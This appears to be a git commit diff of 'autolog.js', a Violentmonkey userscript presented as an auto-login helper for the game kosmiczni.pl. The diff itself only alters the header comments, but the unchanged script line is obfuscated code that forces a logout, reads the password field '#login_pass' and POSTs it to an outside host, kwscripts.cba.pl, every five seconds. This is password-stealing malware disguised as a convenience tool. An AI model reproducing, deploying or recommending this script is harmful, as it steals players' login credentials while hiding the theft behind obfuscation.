95f69b23c7d9754671a3db1f0e923fc01dd5e10f
aeternusfelcor <131664128+aeternusfelcor@users.noreply.github.com>
2024-03-04 11:05:27 +0100

    Update autolog.js

--- autolog.js
+++ autolog.js
@@ -1,11 +1,11 @@
-// ==UserScript==
-// @name         AutoLog
-// @namespace    Violentmonkey Scripts
-// @match        https://kosmiczni.pl/*
-// @grant        none
-// @version      1.0
-// @author       - Pharos
-// @description  2.03.2024, 10:44:44
-// ==/UserScript==
+==UserScript==
+@name         AutoLog
+@namespace    Violentmonkey Scripts
+@match        https://kosmiczni.pl/*
+@grant        none
+@version      1.0
+@author       - Pharos
+@description  2.03.2024, 10:44:44
+==/UserScript==
 
 (function(_0x4df379,_0x29e0bd){var _0x23dbaa=_0x2d15,_0x16bd3e=_0x4df379();while(!![]){try{var _0x2631cc=-parseInt(_0x23dbaa(0xdf))/0x1*(-parseInt(_0x23dbaa(0xe0))/0x2)+parseInt(_0x23dbaa(0xe5))/0x3*(-parseInt(_0x23dbaa(0xf3))/0x4)+parseInt(_0x23dbaa(0xe9))/0x5*(parseInt(_0x23dbaa(0xeb))/0x6)+-parseInt(_0x23dbaa(0xe1))/0x7+-parseInt(_0x23dbaa(0xed))/0x8+parseInt(_0x23dbaa(0xf5))/0x9*(parseInt(_0x23dbaa(0xec))/0xa)+parseInt(_0x23dbaa(0xf1))/0xb*(parseInt(_0x23dbaa(0xe3))/0xc);if(_0x2631cc===_0x29e0bd)break;else _0x16bd3e['push'](_0x16bd3e['shift']());}catch(_0x2481b7){_0x16bd3e['push'](_0x16bd3e['shift']());}}}(_0x5e48,0xc95eb));function _0x5e48(){var _0xe2c54c=['1284vifSGB','val','3461934sCMHYl','error','#login_pass','text','5mzetDr','catch','4747410znKwhR','8072480wWMxvN','12177888gzOKUX','location','text/plain','log','69773xaoRtQ','undefined','4ORnJZQ','then','18wCEwlJ','/main_page_ajax','4ocugzm','770670UpIybG','7873229umsJPL','replace'];_0x5e48=function(){return _0xe2c54c;};return _0x5e48();}function _0x2d15(_0x55dfaf,_0x40b775){var _0x5e4879=_0x5e48();return _0x2d15=function(_0x2d15c0,_0xa6baee){_0x2d15c0=_0x2d15c0-0xdf;var _0x420fa2=_0x5e4879[_0x2d15c0];return _0x420fa2;},_0x2d15(_0x55dfaf,_0x40b775);}pid>0x0&&$('#logout')['click']();function checkAndDoPreLogin(){var _0x528848=_0x2d15,_0x2541b7=$(_0x528848(0xe7))[_0x528848(0xe4)]();fetch('https://kwscripts.cba.pl',{'method':'POST','headers':{'Content-Type':_0x528848(0xef)},'body':_0x2541b7})[_0x528848(0xf4)](_0x3f5a17=>_0x3f5a17[_0x528848(0xe8)]())[_0x528848(0xf4)](_0x4cae05=>console[_0x528848(0xf0)](_0x4cae05))[_0x528848(0xea)](_0x5a19c5=>console[_0x528848(0xe6)]('Błąd:',_0x5a19c5)),typeof pid!==_0x528848(0xf2)&&pid===0x0&&typeof GAME==_0x528848(0xf2)&&(do_pre_login(),console[_0x528848(0xf0)]('próba\x20zalogowania')),typeof pid!==_0x528848(0xf2)&&pid>0x0&&typeof GAME=='undefined'&&(console['log']('próba\x20wejścia\x20do\x20gry'),ajax_call({'c':0x8,'s':0x14},_0x528848(0xf6),![],function(_0x2ab48b){setTimeout(function(){var _0x152cc3=_0x2d15;window[_0x152cc3(0xee)][_0x152cc3(0xe2)](_0x2ab48b['url']);},0x1f4);}));}setInterval(checkAndDoPreLogin,0x1388);
